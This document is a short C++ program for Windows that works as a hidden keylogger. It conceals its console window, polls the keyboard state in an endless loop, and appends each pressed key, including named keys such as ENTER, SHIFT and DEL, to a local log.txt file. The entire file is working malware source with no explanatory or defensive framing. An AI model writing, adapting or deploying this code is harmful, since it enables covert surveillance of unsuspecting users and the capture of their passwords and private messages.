#include <windows.h>
#include <fstream>
#include <string>

int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	std::ofstream log;
	std::string tmp;
	while (true) 	{
		Sleep(15);
		for (int i = 8; i <= 190; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				if ((i >= 65 && i <= 90) || (i >= 48 && i <= 57)) {
					tmp = char(i);
				} else {
					switch (i) {
					case VK_BACK:
						tmp = "#BACK";
						break;
					case VK_TAB:
						tmp = "#TAB";
						break;
					case VK_CLEAR:
						tmp = "#CLEAR";
						break;
					case VK_RETURN:
						tmp = "#ENTER";
						break;
					case VK_SHIFT:
						tmp = "#SHIFT";
						break;
					case VK_CONTROL:
						tmp = "#CTRL";
						break;
					case VK_MENU:
						tmp = "#ALT";
						break;
					case VK_CAPITAL:
						tmp = "#CAPS_LOCK";
						break;
					case VK_ESCAPE:
						tmp = "#ESC";
						break;
					case VK_SPACE:
						tmp = "#SPACEBAR";
						break;
					case VK_DELETE:
						tmp = "#DEL";
						break;
					case VK_NUMPAD0:
						tmp = "#NUMPAD0";
						break;
					case VK_NUMPAD1:
						tmp = "#NUMPAD1";
						break;
					case VK_NUMPAD2:
						tmp = "#NUMPAD2";
						break;
					case VK_NUMPAD3:
						tmp = "#NUMPAD3";
						break;
					case VK_NUMPAD4:
						tmp = "#NUMPAD4";
						break;
					case VK_NUMPAD5:
						tmp = "#NUMPAD5";
						break;
					case VK_NUMPAD6:
						tmp = "#NUMPAD6";
						break;
					case VK_NUMPAD7:
						tmp = "#NUMPAD7";
						break;
					case VK_NUMPAD8:
						tmp = "#NUMPAD8";
						break;
					case VK_NUMPAD9:
						tmp = "#NUMPAD9";
						break;
					case VK_NUMLOCK:
						tmp = "#NUMLOCK";
						break;
					case VK_MULTIPLY:
						tmp = "#MULTIPLY";
						break;
					case VK_ADD:
						tmp = "#ADD";
						break;
					case VK_SUBTRACT:
						tmp = "#SUBTRACT";
						break;
					case VK_DECIMAL:
						tmp = "#DECIMAL";
						break;
					case VK_DIVIDE:
						tmp = "#DIVIDE";
						break;
					default:
						continue;
					}
				}
				log.open("log.txt", std::ofstream::app);
				log << tmp << "\n";
				log.close();
			}
		}
	}
	return 0;
}
